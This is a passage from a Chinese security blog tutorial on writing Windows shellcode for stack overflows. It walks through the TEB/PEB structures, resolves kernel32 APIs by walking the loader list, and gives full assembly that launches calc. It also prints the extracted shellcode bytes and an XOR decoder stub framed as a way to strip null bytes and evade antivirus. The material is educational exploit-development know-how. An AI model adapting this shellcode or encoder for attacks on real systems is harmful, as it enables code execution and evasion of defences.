<li>基址(image base):pe文件装入内存时的基地址,例如exe文件在内存中的基址是0x00400000.</li>
<li>虚拟内存地址(virtual addr,VA):pe文件中的指令被装入内存时的地址.</li>
<li>相对虚拟地址(relative virtual addr,RVA):内存地址相对于映射基址的偏移量.<br />
三者关系: VA=RVA+基址.</li>
</ol>
<p>编写shellcode也是有章可循的,不同版本的windows加载dll有不同的基址. 为了shellcode能在任何不可预料的环境工作(是否aslr),目标api的地址不能用绝对地址.那么只有相对了,因为shellcode可以导入任何dll并调用其函数,如果漏洞程序已经导入了LoadLibrary和GetProcAddress函数最好,但真实情况往往没那么顺利.</p>
<p>假设我们shellcode的目的是运行cmd.exe,winexe、shellexecute(shellexecuteEx)、createprocess可以实现,前两个api最终都是createprocess实现,而createprocess是kernel32.dll的导出函数. 目前用的最广泛的办法是通过进程控制模块(PEB)来确定dll的导出表,并确定程序运行时所需api在内存中的虚拟地址. PEB是一种进程结构,类似的还有TEB线程控制模块(Thread Environment Block)</p>
<h3>操作步骤:</h3>
<p>1.通过段寄存器fs确定找到当前的线程控制模块TEB,PEB位于fs:[0x30]地址的double word里,通过这个指针即可获得PEB地址 code:</p>
<pre class="">__asm
{
mov eax,fs:[0x30]
mov PEB,eax
}</pre>
<h3>TEB结构:</h3>
<pre class="">+0x000 NtTib : _NT_TIB 
 +0x01c EnvironmentPointer : Ptr32 Void
 +0x020 ClientId : _CLIENT_ID //
 +0x028 ActiveRpcHandle : Ptr32 Void
 +0x02c ThreadLocalStoragePointer : Ptr32 Void
 +0x030 ProcessEnvironmentBlock : Ptr32 _PEB
 +0x034 LastErrorValue : Uint4B
 +0x038 CountOfOwnedCriticalSections : Uint4B
 +0x03c CsrClientThread : Ptr32 Void
 +0x040 Win32ThreadInfo : Ptr32 Void
 +0x044 User32Reserved : [26] Uint4B
 +0x0ac UserReserved : [5] Uint4B
 +0x0c0 WOW32Reserved : Ptr32 Void
 +0x0c4 CurrentLocale : Uint4B
 +0x0c8 FpSoftwareStatusRegister : Uint4B
 +0x0cc SystemReserved1 : [54] Ptr32 Void
 +0x1a4 ExceptionCode : Int4B
 +0x1a8 ActivationContextStack : _ACTIVATION_CONTEXT_STACK
 +0x1bc SpareBytes1 : [24] UChar
 +0x1d4 GdiTebBatch : _GDI_TEB_BATCH
 +0x6b4 RealClientId : _CLIENT_ID
 +0x6bc GdiCachedProcessHandle : Ptr32 Void
 +0x6c0 GdiClientPID : Uint4B
 +0x6c4 GdiClientTID : Uint4B
 +0x6c8 GdiThreadLocalInfo : Ptr32 Void
 +0x6cc Win32ClientInfo : [62] Uint4B
 +0x7c4 glDispatchTable : [233] Ptr32 Void
 +0xb68 glReserved1 : [29] Uint4B
 +0xbdc glReserved2 : Ptr32 Void
 +0xbe0 glSectionInfo : Ptr32 Void
 +0xbe4 glSection : Ptr32 Void
 +0xbe8 glTable : Ptr32 Void
 +0xbec glCurrentRC : Ptr32 Void
 +0xbf0 glContext : Ptr32 Void
 +0xbf4 LastStatusValue : Uint4B
 +0xbf8 StaticUnicodeString : _UNICODE_STRING
 +0xc00 StaticUnicodeBuffer : [261] Uint2B
 +0xe0c DeallocationStack : Ptr32 Void
 +0xe10 TlsSlots : [64] Ptr32 Void
 +0xf10 TlsLinks : _LIST_ENTRY
 +0xf18 Vdm : Ptr32 Void
 +0xf1c ReservedForNtRpc : Ptr32 Void
 +0xf20 DbgSsReserved : [2] Ptr32 Void
 +0xf28 HardErrorsAreDisabled : Uint4B
 +0xf2c Instrumentation : [16] Ptr32 Void
 +0xf6c WinSockData : Ptr32 Void
 +0xf70 GdiBatchCount : Uint4B
 +0xf74 InDbgPrint : UChar
 +0xf75 FreeStackOnTermination : UChar
 +0xf76 HasFiberData : UChar
 +0xf77 IdealProcessor : UChar
 +0xf78 Spare3 : Uint4B
 +0xf7c ReservedForPerf : Ptr32 Void
 +0xf80 ReservedForOle : Ptr32 Void
 +0xf84 WaitingOnLoaderLock : Uint4B
 +0xf88 Wx86Thread : _Wx86ThreadState
 +0xf94 TlsExpansionSlots : Ptr32 Ptr32 Void
 +0xf98 ImpersonationLocale : Uint4B
 +0xf9c IsImpersonating : Uint4B
 +0xfa0 NlsCache : Ptr32 Void
 +0xfa4 pShimData : Ptr32 Void
 +0xfa8 HeapVirtualAffinity : Uint4B
 +0xfac CurrentTransactionHandle : Ptr32 Void
 +0xfb0 ActiveFrame : Ptr32 _TEB_ACTIVE_FRAME
 +0xfb4 SafeThunkCall : UChar
 +0xfb5 BooleanSpare : [3] UChar</pre>
<p>TEB若干指针各偏移说明: FS:[000] 指向SEH链指针 FS:[004] 线程堆栈顶部 FS:[008] 线程堆栈底部 FS:[00C] SubSystemTib FS:[010] FiberData FS:[014] ArbitraryUserPointer FS:[018] 指向TEB自身 FS:[020] 进程PID FS:[024] 线程ID FS:[02C] 指向线程局部存储指针 FS:[030] PEB结构地址（进程结构） FS:[034] 上个错误号</p>
<h3>PEB结构：</h3>
<pre class="">typedef struct _PEB { 
 000h UCHAR InheritedAddressSpace;
 001h UCHAR ReadImageFileExecOptions;
 002h UCHAR BeingDebugged; 
 003h UCHAR SpareBool;
 004h HANDLE Mutant;
 008h HINSTANCE ImageBaseAddress; 
 00Ch struct _PEB_LDR_DATA *Ldr //Ptr32 _PEB_LDR_DATA
 010h struct _RTL_USER_PROCESS_PARAMETERS *ProcessParameters;
 014h ULONG SubSystemData;
 018h HANDLE DefaultHeap;
 01Ch KSPIN_LOCK FastPebLock;
 020h ULONG FastPebLockRoutine;
 024h ULONG FastPebUnlockRoutine;
 028h ULONG EnvironmentUpdateCount;
 02Ch ULONG KernelCallbackTable;
 030h LARGE_INTEGER SystemReserved;
 038h struct _PEB_FREE_BLOCK *FreeList
 03Ch ULONG TlsExpansionCounter;
 040h ULONG TlsBitmap;
 044h LARGE_INTEGER TlsBitmapBits;
 04Ch ULONG ReadOnlySharedMemoryBase;
 050h ULONG ReadOnlySharedMemoryHeap;
 054h ULONG ReadOnlyStaticServerData;
 058h ULONG AnsiCodePageData;
 05Ch ULONG OemCodePageData;
 060h ULONG UnicodeCaseTableData;
 064h ULONG NumberOfProcessors;
 068h LARGE_INTEGER NtGlobalFlag; // Address of a local copy
 070h LARGE_INTEGER CriticalSectionTimeout;
 078h ULONG HeapSegmentReserve;
 07Ch ULONG HeapSegmentCommit;
 080h ULONG HeapDeCommitTotalFreeThreshold;
 084h ULONG HeapDeCommitFreeBlockThreshold;
 088h ULONG NumberOfHeaps;
 08Ch ULONG MaximumNumberOfHeaps;
 090h ULONG ProcessHeaps;
 094h ULONG GdiSharedHandleTable;
 098h ULONG ProcessStarterHelper;
 09Ch ULONG GdiDCAttributeList;
 0A0h KSPIN_LOCK LoaderLock;
 0A4h ULONG OSMajorVersion;
 0A8h ULONG OSMinorVersion;
 0ACh USHORT OSBuildNumber;
 0AEh USHORT OSCSDVersion;
 0B0h ULONG OSPlatformId;
 0B4h ULONG ImageSubsystem;
 0B8h ULONG ImageSubsystemMajorVersion;
 0BCh ULONG ImageSubsystemMinorVersion;
 0C0h ULONG ImageProcessAffinityMask;
 0C4h ULONG GdiHandleBuffer[0x22];
 14Ch ULONG PostProcessInitRoutine;
 150h ULONG TlsExpansionBitmap;
 154h UCHAR TlsExpansionBitmapBits[0x80];
 1D4h ULONG SessionId;
} PEB, *PPEB;</pre>
<p>2.在PEB偏移0x0c处,就是指向_PEB_LDR_DATA的指针,表示加载dll的列表. 3.在LDR结构中确定kernel32.dll</p>
<pre class="">typedef struct _PEB_LDR_DATA
{
　ULONG Length; // 00h
　BOOLEAN Initialized; // 04h
　PVOID SsHandle; // 08h
　LIST_ENTRY InLoadOrderModuleList; // 0ch
　LIST_ENTRY InMemoryOrderModuleList; // 14h
　LIST_ENTRY InInitializationOrderModuleList; // 1ch
}</pre>
<p>LDR结构偏移0x1c处指向InInitializationOrderModuleList链表.此链表第一个节点是ntdll.dll,第二个是kernel32.dll.<br />
在节点&#8221;kernel32.dll&#8221;偏移0x08处就是kernel32.dll在内存中的加载基址.</p>
<p>4.在kernel32.dll的加载基址算起,偏移0x3c地方就是PE头.</p>
<p>5.pe头偏移0x78处存放指向函数导出表的指针,0x18到0x1B保存导出的函数数量,0x1c处指向api的RVA,0x20到0x23保存导出函数名的偏移量. 精准定位Loadlibrary和GetProcAddress后,定位其他api就容易多了.</p>
<p><img class="alignnone size-full wp-image-86833 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/11-5.png" alt="11" width="755" height="509" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/11-5.png 755w, http://www.mottoin.com/wp-content/uploads/2016/08/11-5-300x202.png 300w" sizes="(max-width: 755px) 100vw, 755px" /></p>
<p>在对多api进行匹配的时候,假设用全字符匹配会占用很多的栈空间,这里我们用hash将字符串设为一个定长.匹配时对链表内的api进行同样的hash运算即可.</p>
<pre class="">#include "stdafx.h"
#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;
DWORD GetHash(char *fname)
{
 printf("%s",fname);
 DWORD dret = 0;
 while(*fname)
 {
 dret = ((dret&lt;&lt;25)|(dret&gt;&gt;7));
 dret += *fname;
 fname++;
 }
 printf(" function`s hash is %.8x\n",dret);
 return dret;
}
int main(int argc, char* argv[])
{
 Gethash("ExitProcess");
 GetHash("MessageBoxA");
 GetHash("LoadLibraryA");
 GetHash("GetProcAddress");
 return 0;
}</pre>
<p>经过hash后的字符串定长4字节. MessageBoxA functions hash is 1e380a6a ExitProcess functions hash is 4fd18963 LoadLibraryA functions hash is 0c917432 GetProcAddress functions hash is bbafdf85</p>
<p>当然,我们可以随意设计hash将输出定长控制的更短,kernel32.dll导出函数900+,在能达到目的的前提下可以接受hash碰撞. 在用到的api比较少的情况下,用hash运算就得不偿失了,因为要在shellcode里加入hash运算的代码和字符串匹配的代码. 看以下代码:</p>
<pre class="">int main() 
{ 
 __asm{ 
 nop; 
 nop; 
 nop; 
 nop; 
 nop; 
 nop; 
 nop;

push ebp; 
 mov esi,fs:0x30; //PEB 
 mov esi, [esi + 0x0C]; //+0x00c Ldr : Ptr32 _PEB_LDR_DATA 
 mov esi, [esi + 0x1C]; //+0x01c InInitializationOrderModuleList : _LIST_ENTRY 
next_module: 
 mov ebp, [esi + 0x08]; 
 mov edi, [esi + 0x20]; 
 mov esi, [esi]; 
 cmp [edi + 12*2],cl; 
 jne next_module; 
 mov edi,ebp;

//寻找GetProcAddress地址 
 sub esp,100; 
 mov ebp,esp; 
 mov eax,[edi+3ch];//PE头 
 mov edx,[edi+eax+78h] 
 add edx,edi; 
 mov ecx,[edx+18h];//函数数量 
 mov ebx,[edx+20h]; 
 add ebx,edi; 
search: 
 dec ecx; 
 mov esi,[ebx+ecx*4]; 
 add esi,edi; 
 mov eax,0x50746547; 
 cmp [esi],eax; 
 jne search; 
 mov eax,0x41636f72; 
 cmp [esi+4],eax; 
 jne search; 
 mov ebx,[edx+24h]; 
 add ebx,edi; 
 mov cx,[ebx+ecx*2]; 
 mov ebx,[edx+1ch]; 
 add ebx,edi; 
 mov eax,[ebx+ecx*4]; 
 add eax,edi; 
 mov [ebp+76],eax;//eax为GetProcAddress地址

//获取LoadLibrary地址 
 push 0; 
 push 0x41797261; 
 push 0x7262694c; 
 push 0x64616f4c; 
 push esp 
 push edi 
 call [ebp+76] 
 mov[ebp+80],eax;

//获取ExitProcess地址 
 push 0; 
 push 0x737365; 
 push 0x636f7250; 
 push 0x74697845; 
 push esp; 
 push edi; 
 call [ebp+76]; 
 mov [ebp+84],eax;

//加载msvcrt.dll LoadLibrary("msvcrt") 
 push 0; 
 push 0x7472; 
 push 0x6376736d; 
 push esp; 
 call [ebp+80]; 
 mov edi,eax;

//获取system地址 
 push 0; 
 push 0x6d65; 
 push 0x74737973; 
 push esp; 
 push edi; 
 call [ebp+76]; 
 mov [ebp+92],eax;

//system("calc") 
 push 0; 
 push 0x636c6163; 
 push esp; 
 call [ebp+92];

//ExitProcess 
 call [ebp+84];

nop; 
 nop; 
 nop; 
 nop; 
 nop; 
 } 
 return 0; 
}</pre>
<p>增加nop是为了在编辑器的16进制模式下便于提取shellcode.当然你也可以用od搜索命令来提取.或者直接用Asm2MachineCode.</p>
<p>提取shellcode如下:</p>
<pre class="">"\x55\x64\x8B\x35\x30\x00\x00\x00\x8B\x76\x0C\x8B\x76\x1C\x8B\x6E\x08\x8B\x7E\x20\x8B\x36\x38\x4F\x18\x75\xF3\x8B\xFD\x83\xEC\x64\x8B\xEC\x8B\x47\x3C\x8B\x54\x07\x78\x03\xD7\x8B\x4A\x18\x8B\x5A\x20\x03\xDF\x49\x8B\x34\x8B\x03\xF7\xB8\x47\x65\x74\x50\x39\x06\x75\xF1\xB8\x72\x6F\x63\x41\x39\x46\x04\x75\xE7\x8B\x5A\x24\x03\xDF\x66\x8B\x0C\x4B\x8B\x5A\x1C\x03\xDF\x8B\x04\x8B\x03\xC7\x89\x45\x4C\x6A\x00\x68\x61\x72\x79\x41\x68\x4C\x69\x62\x72\x68\x4C\x6F\x61\x64\x54\x57\xFF\x55\x4C\x89\x45\x50\x6A\x00\x68\x65\x73\x73\x00\x68\x50\x72\x6F\x63\x68\x45\x78\x69\x74\x54\x57\xFF\x55\x4C\x89\x45\x54\x6A\x00\x68\x72\x74\x00\x00\x68\x6D\x73\x76\x63\x54\xFF\x55\x50\x8B\xF8\x6A\x00\x68\x65\x6D\x00\x00\x68\x73\x79\x73\x74\x54\x57\xFF\x55\x4C\x89\x45\x5C\x6A\x00\x68\x63\x61\x6C\x63\x54\xFF\x55\x5C\xFF\x55\x54"</pre>
<p>可以看到在shellcode里含有些许null字节(\x00),字符串函数遇到null会终止,那么只有对shellcode进行加密了. 最常见的方法就是xor异或加密,早年做过免杀的朋友对此一定不陌生.看流程图:</p>
<p><img class="alignnone size-full wp-image-86834 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/12-4.png" alt="12" width="727" height="305" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/12-4.png 727w, http://www.mottoin.com/wp-content/uploads/2016/08/12-4-300x126.png 300w" sizes="(max-width: 727px) 100vw, 727px" /></p>
<p>网上有一些用c写的异或加密算法,然后在shellcode头部解密,其实完全用汇编来写更方便</p>
<pre class="">0042605E 60 PUSHAD
0042605F B8 7D604200 MOV EAX,0042607D
00426064 33C9 XOR ECX,ECX
00426066 8A1C08 MOV BL,BYTE PTR DS:[EAX+ECX]
00426069 80FB 90 CMP BL,90
0042606C 74 0F JE SHORT aaa.00426077
0042606E 80F3 9A XOR BL,9A
00426071 881C08 MOV BYTE PTR DS:[EAX+ECX],BL
00426074 41 INC ECX
00426075 ^EB EF JMP SHORT aaa.00426066
00426077 90 POPAD</pre>
<p>在任意程序里,添加一个区段,写入加密算法和shellcode</p>
<p><img class="alignnone size-full wp-image-86835 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/13-5.png" alt="13" width="990" height="458" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/13-5.png 990w, http://www.mottoin.com/wp-content/uploads/2016/08/13-5-300x139.png 300w, http://www.mottoin.com/wp-content/uploads/2016/08/13-5-768x355.png 768w" sizes="(max-width: 990px) 100vw, 990px" /></p>
<p>控制eip再执行一次就可以恢复shellcode.</p>
<p><img class="alignnone size-full wp-image-86836 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/14-5.png" alt="14" width="990" height="458" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/14-5.png 990w, http://www.mottoin.com/wp-content/uploads/2016/08/14-5-300x139.png 300w, http://www.mottoin.com/wp-content/uploads/2016/08/14-5-768x355.png 768w" sizes="(max-width: 990px) 100vw, 990px" /></p>
<p>算法是测试随手写的,加密的起始位置我写的绝对地址0042607D,真实情况当然不是这样的,溢出时eip指向esp,应该改成mov eax,esp,然后还得跳过算法部分,累加在eax寄存器上,add eax,单字节地址总共三个字节,在这句指令之后还有20个字节,所以是23,换算16进制是17.</p>
<p>算法如下:</p>
<pre class="">00426065 8BC4 MOV EAX,ESP
00426067 83C0 16 ADD EAX,16
0042606A 33C9 XOR ECX,ECX
0042606C 8A1C08 MOV BL,BYTE PTR DS:[EAX+ECX]
0042606F 80FB 90 CMP BL,90
00426072 74 09 JE SHORT eeee.0042607D
00426074 80F3 9A XOR BL,9A
00426077 881C08 MOV BYTE PTR DS:[EAX+ECX],BL
0042607A 41 INC ECX
0042607B ^EB EF JMP SHORT eeee.0042606C</pre>
<p>异或算法24字节+shellcode201字节&gt;206.注释掉ExitProcess即可满足长度要求</p>
<pre class="">/*
 //获取ExitProcess地址 
 push 0; 
 push 0x737365; 
 push 0x636f7250; 
 push 0x74697845; 
 push esp; 
 push edi; 
 call [ebp+76]; 
 mov [ebp+84],eax; 
*/
...
//call [ebp+84]</pre>
<h2>0x05 参考</h2>
<p>《深入理解计算机系统》</p>
<p>《shellcoder编程揭秘》</p>
<p>《0day安全2》</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p style="text-align: center;">*来源：<a href="http://www.ohvirus.com/">pr0mise</a>  Mottoin小编整理发布</p>
                                                        <div class="entry-copyright"><p>原创文章，作者：Moto，如若转载，请注明出处：http://www.mottoin.com/86821.html</p></div>                        </div>
                        <div class="entry-footer">
                            <div class="entry-tag"><a href="http://www.mottoin.com/tag/shellcode" rel="tag">shellcode</a><a href="http://www.mottoin.com/tag/%e6%a0%88%e6%ba%a2%e5%87%ba" rel="tag">栈溢出</a></div>
                            <div class="entry-action">
                                <div class="btn-zan" data-id="86821"><i class="fa fa-thumbs-up"></i> 赞 <span class="entry-action-num">(0)</span></div>

                                
                            </div>
                            <div class="entry-bar">
                                <div class="entry-bar-inner clearfix">
                                                                            <div class="author pull-left">
                                            <a data-user="7" target="_blank" href="http://www.mottoin.com/user/seceditor/" class="avatar">
                                                <img src="http://gravatar.com/avatar/?s=400&d=mm" class="func-um_user gravatar avatar avatar-60 um-avatar um-avatar-gravatar" width="60" height="60" alt="Moto" />                                                Moto                                            </a>
                                            <span class="author-title">普通用户</span>                                         </div>
                                                                        <div class="info pull-right">
                                        <div class="info-item meta">
                                            <a class="meta-item j-heart" href="javascript:;" data-id="86821"><i class="fa fa-heart"></i> <span class="data">0</span></a>
                                            <a class="meta-item" href="#comments"><i class="fa fa-comment"></i> <span class="data">1</span></a>
                                                                                    </div>
                                        <div class="info-item share">
                                            <a class="meta-item" href="javascript:;">
                                                <i class="fa fa-wechat"></i>
                                                <span class="wx-wrap">
                                                    <img src="//pan.baidu.com/share/qrcode?w=320&h=320&url=http://www.mottoin.com/86821.html">
                                                    <span>扫码分享到微信</span>
                                                </span>
                                            </a>
                                            <a class="meta-item" href="http://share.baidu.com/s?type=text&searchPic=1&sign=on&to=tsina&key=&url=http%3A%2F%2Fwww.mottoin.com%2F86821.html&title=%E4%BB%8E%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%B0%E7%AE%80%E5%8D%95%E7%9A%84shellcode%E5%BC%80%E5%8F%91" target="_blank"><i class="fa fa-weibo"></i></a>
                                            <a class="meta-item" href="http://share.baidu.com/s?type=text&searchPic=1&sign=on&to=qzone&key=&url=http%3A%2F%2Fwww.mottoin.com%2F86821.html&title=%E4%BB%8E%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%B0%E7%AE%80%E5%8D%95%E7%9A%84shellcode%E5%BC%80%E5%8F%91" target="_blank"><i class="fa fa-qq"></i></a>
                                        </div>
                                        <div class="info-item act">
                                            <a href="javascript:;" id="j-reading"><i class="fa fa-file-text"></i></a>
                                        </div>
                                    </div>
                                </div>
                            </div>
                                                        <h3 class="entry-related-title">相关推荐</h3><ul class="entry-related clearfix"><li><a href="http://www.mottoin.com/86490.html" title="基于zmap的应用层扫描器zgrab">基于zmap的应用层扫描器zgrab</a></li><li><a href="http://www.mottoin.com/92388.html" title="使用DNX.EXE绕过应用白名单">使用DNX.EXE绕过应用白名单</a></li><li><a href="http://www.mottoin.com/89287.html" title="POWERSHELL EMPIRE + CVE-2016-0189 = PROFIT">POWERSHELL EMPIRE + CVE-2016-0189 = PROFIT</a></li><li><a href="http://www.mottoin.com/104564.html" title="攻击者利用fast-flux技术隐藏恶意网址">攻击者利用fast-flux技术隐藏恶意网址</a></li><li><a href="http://www.mottoin.com/91044.html" title="使用DNS 预读取绕过Content Security Policy（CSP）">使用DNS 预读取绕过Content Security Policy（CSP）</a></li><li><a href="http://www.mottoin.com/87266.html" title="使用Powershell反弹Meterpreter Shell">使用Powershell反弹Meterpreter Shell</a></li><li><a href="http://www.mottoin.com/88011.html" title="Drupal Coder模块命令执行漏洞分析">Drupal Coder模块命令执行漏洞分析</a></li><li><a href="http://www.mottoin.com/90304.html" title="如何利用配置错误的SUID获取root权限并提权">如何利用配置错误的SUID获取root权限并提权</a></li><li><a href="http://www.mottoin.com/84257.html" title="web前端安全编码">web前端安全编码</a></li><li><a href="http://www.mottoin.com/88841.html" title="Powershell禁用绕过白名单防护">Powershell禁用绕过白名单防护</a></li></ul>                        </div>
                        
<div id="comments" class="entry-comments">
    	<div id="respond" class="comment-respond">
		<h3 id="reply-title" class="comment-reply-title">发表评论 <small><a rel="nofollow" id="cancel-comment-reply-link" href="/86821.html#respond" style="display:none;">取消回复</a></small></h3><div class="comment-form"><div class="comment-must-login">请登录后评论...</div><div class="form-submit"><div class="form-submit-text pull-left"><a href="http://www.mottoin.com/login">登录</a>后才能评论</div> <input name="submit" type="submit" id="must-submit" class="submit" value="发表"></div></div>	</div><!-- #respond -->
				<h3 class="comments-title">
			评论列表（1条）		</h3>

		<ul class="comments-list">
					</ul><!-- .comment-list -->
        <div class="pagination clearfix">
                    </div>
	</div><!-- .comments-area -->                    </div>
                </article>
                    </div>
        <aside class="sidebar">
            <div id="profile-3" class="widget widget_profile">                <div class="cover_photo"></div>
                        <div class="avatar-wrap">
                <a target="_blank" href="http://www.mottoin.com/user/seceditor/" class="avatar-link"><img src="http://gravatar.com/avatar/?s=400&d=mm" class="func-um_user gravatar avatar avatar-120 um-avatar um-avatar-gravatar" width="120" height="120" alt="Moto" /></a></div>
            <div class="profile-info">
                <p><span class="author-name">Moto</span><span class="author-title">普通用户</span></p>
                <p class="author-description"></p>
            </div>
            <div class="profile-posts">
                <h3 class="widget-title"><span>最近文章</span></h3>
                <ul>                    <li><a href="http://www.mottoin.com/101279.html" title="Windows内核漏洞发现与利用">Windows内核漏洞发现与利用</a></li>
                                    <li><a href="http://www.mottoin.com/100495.html" title="浏览器信息收集: 利用 PowerShell 无文件读取 Chrome Cookie">浏览器信息收集: 利用 PowerShell 无文件读取 Chrome Cookie</a></li>
                                    <li><a href="http://www.mottoin.com/99735.html" title="一键无文件感染技术分析">一键无文件感染技术分析</a></li>
                                    <li><a href="http://www.mottoin.com/99776.html" title="APT10：中国黑客组织攻击全球IT服务供应商">APT10：中国黑客组织攻击全球IT服务供应商</a></li>
                                    <li><a href="http://www.mottoin.com/99257.html" title="IIS 6.0 WebDAV远程代码执行（CVE-2017-7269）">IIS 6.0 WebDAV远程代码执行（CVE-2017-7269）</a></li>
                </ul>            </div>
            </div><div id="custom_html-3" class="widget_text widget widget_custom_html"><div class="textwidget custom-html-widget"><a class="btn-post" href="/question"><i class="fa fa-edit"></i> 我要提问</a></div></div><div id="post-thumb-3" class="widget widget_post_thumb">            <ul>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105921.html" title="“黑客反击”的合法化之争">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/170918-Cox-The-Hackers-Hitting-Back-At-Cybercriminals-hero_vkcor5-480x300.gif" width="480" height="300" alt="“黑客反击”的合法化之争">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105921.html" title="“黑客反击”的合法化之争">“黑客反击”的合法化之争</a></p>
                            <p class="item-date">2017年9月20日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105917.html" title="美参议员要求电信巨头们回应SS7信令系统的安全问题">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG929-480x300.jpeg" width="480" height="300" alt="美参议员要求电信巨头们回应SS7信令系统的安全问题">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105917.html" title="美参议员要求电信巨头们回应SS7信令系统的安全问题">美参议员要求电信巨头们回应SS7信令系统的安全问题</a></p>
                            <p class="item-date">2017年9月19日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105914.html" title="美国国土安全部发布禁止使用卡巴斯基产品的明细">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG928-480x300.jpeg" width="480" height="300" alt="美国国土安全部发布禁止使用卡巴斯基产品的明细">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105914.html" title="美国国土安全部发布禁止使用卡巴斯基产品的明细">美国国土安全部发布禁止使用卡巴斯基产品的明细</a></p>
                            <p class="item-date">2017年9月19日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105885.html" title="【威胁预警】供应链攻击：CCleaner 5.33官方下载被植入恶意代码（附技术详解）">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG906-480x300.jpeg" width="480" height="300" alt="【威胁预警】供应链攻击：CCleaner 5.33官方下载被植入恶意代码（附技术详解）">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105885.html" title="【威胁预警】供应链攻击：CCleaner 5.33官方下载被植入恶意代码（附技术详解）">【威胁预警】供应链攻击：CCleaner 5.33官方下载被植入恶意代码（附技术详解）</a></p>
                            <p class="item-date">2017年9月19日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105879.html" title="全球首款网络安全概念车驶入上海滩">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/15057198871-480x300.png" width="480" height="300" alt="全球首款网络安全概念车驶入上海滩">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105879.html" title="全球首款网络安全概念车驶入上海滩">全球首款网络安全概念车驶入上海滩</a></p>
                            <p class="item-date">2017年9月18日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105872.html" title="暗网市场上开始兜售Equifax的数据，数据泄漏后常见的诈骗招数1、2、3">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG897-480x300.jpeg" width="480" height="300" alt="暗网市场上开始兜售Equifax的数据，数据泄漏后常见的诈骗招数1、2、3">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105872.html" title="暗网市场上开始兜售Equifax的数据，数据泄漏后常见的诈骗招数1、2、3">暗网市场上开始兜售Equifax的数据，数据泄漏后常见的诈骗招数1、2、3</a></p>
                            <p class="item-date">2017年9月18日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105865.html" title="美国财政部确认伊朗11个实体的恶意网络活动，宣布对它们实施制裁">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG896-480x300.jpeg" width="480" height="300" alt="美国财政部确认伊朗11个实体的恶意网络活动，宣布对它们实施制裁">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105865.html" title="美国财政部确认伊朗11个实体的恶意网络活动，宣布对它们实施制裁">美国财政部确认伊朗11个实体的恶意网络活动，宣布对它们实施制裁</a></p>
                            <p class="item-date">2017年9月18日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105858.html" title="DHS称美国政府不能正确评估 WannaCry 和NotPetya的影响，对企业缺乏适当的保护">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG150-480x300.jpeg" width="480" height="300" alt="DHS称美国政府不能正确评估 WannaCry 和NotPetya的影响，对企业缺乏适当的保护">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105858.html" title="DHS称美国政府不能正确评估 WannaCry 和NotPetya的影响，对企业缺乏适当的保护">DHS称美国政府不能正确评估 WannaCry 和NotPetya的影响，对企业缺乏适当的保护</a></p>
                            <p class="item-date">2017年9月17日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
